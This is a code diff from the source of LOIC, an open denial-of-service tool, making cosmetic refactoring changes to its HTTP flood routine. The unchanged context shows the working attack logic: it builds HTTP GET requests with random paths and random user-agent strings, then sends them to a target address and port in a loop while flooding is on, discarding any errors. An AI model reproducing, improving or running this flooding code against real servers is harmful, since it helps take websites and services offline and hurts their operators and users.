@@ -43,11 +43,11 @@ namespace LOIC
 			IsFlooding = true; LastAction = Tick();
 
 			tTimepoll = new System.Windows.Forms.Timer();
-			tTimepoll.Tick += new EventHandler(tTimepoll_Tick);
+			tTimepoll.Tick += tTimepoll_Tick;
 			tTimepoll.Start();
 
 			BackgroundWorker bw = new BackgroundWorker();
-			bw.DoWork += new DoWorkEventHandler(bw_DoWork);
+			bw.DoWork += bw_DoWork;
 			bw.RunWorkerAsync();
 		}
 		void tTimepoll_Tick(object sender, EventArgs e)
@@ -64,8 +64,8 @@ namespace LOIC
 		{
 			try
 			{
-				byte[] buf = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0}{1} HTTP/1.1{5}Host: {3}{5}User-Agent: {2}{5}Accept: */*{5}{4}{5}{5}", Subsite, (AllowRandom ? Functions.RandomString() : ""), Functions.RandomUserAgent(), Host, (AllowGzip ? "Accept-Encoding: gzip, deflate" + Environment.NewLine : ""), Environment.NewLine));
-				IPEndPoint RHost = new IPEndPoint(System.Net.IPAddress.Parse(IP), Port);
+				byte[] buf = Encoding.ASCII.GetBytes(String.Format("GET {0}{1} HTTP/1.1{5}Host: {3}{5}User-Agent: {2}{5}Accept: */*{5}{4}{5}{5}", Subsite, (AllowRandom ? Functions.RandomString() : ""), Functions.RandomUserAgent(), Host, (AllowGzip ? "Accept-Encoding: gzip, deflate" + Environment.NewLine : ""), Environment.NewLine));
+				IPEndPoint RHost = new IPEndPoint(IPAddress.Parse(IP), Port);
 				while (IsFlooding)
 				{
 					State = ReqState.Ready; // SET STATE TO READY //
@@ -95,6 +95,7 @@ namespace LOIC
 						System.Threading.Thread.Sleep(Delay+1);
 				}
 			}
+			// Analysis disable once EmptyGeneralCatchClause
 			catch { }
 			finally { IsFlooding = false; }
 		}
